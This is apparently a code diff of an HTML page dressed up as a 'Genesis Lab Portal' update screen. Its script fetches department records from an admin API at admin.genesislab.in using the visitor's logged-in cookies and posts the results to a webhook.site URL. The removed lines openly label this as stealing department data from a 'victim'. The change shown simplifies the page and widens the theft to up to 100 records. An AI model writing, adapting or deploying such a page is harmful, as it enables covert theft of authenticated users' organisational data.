@@ -1,70 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Genesis Lab - System Update</title>
+    <title>Genesis Lab - Update</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: Arial;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             background: #f0f0f0;
         }
-        .container {
-            text-align: center;
+        .box {
             background: white;
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .status {
-            color: #666;
-            margin-top: 20px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="box">
         <h2>Genesis Lab Portal</h2>
-        <p>Loading system updates...</p>
-        <div class="status">Please wait</div>
+        <p>Loading...</p>
     </div>
 
     <script>
-        // Your webhook URL
         const WEBHOOK = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';
         
-        // Steal department data
-        fetch('https://admin.genesislab.in/api/departments/20', {
+        fetch('https://admin.genesislab.in/api/departments?rowsPerPage=100', {
             credentials: 'include'
         })
-        .then(response => response.json())
+        .then(r => r.json())
         .then(data => {
-            console.log('Stolen department data:', data);
-            
-            // Send to webhook
             fetch(WEBHOOK, {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
                 body: JSON.stringify({
-                    timestamp: new Date().toISOString(),
-                    victim_origin: window.location.origin,
-                    victim_referrer: document.referrer,
-                    stolen_data: data,
-                    endpoint: '/api/departments/20'
+                    total: data.total,
+                    departments: data.data,
+                    timestamp: new Date().toISOString()
                 })
             });
-            
-            // Update UI
-            document.querySelector('.status').innerHTML = 'Update complete: ' + data.name;
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            document.querySelector('.status').innerHTML = 'Error: ' + error.message;
         });
     </script>
 </body>
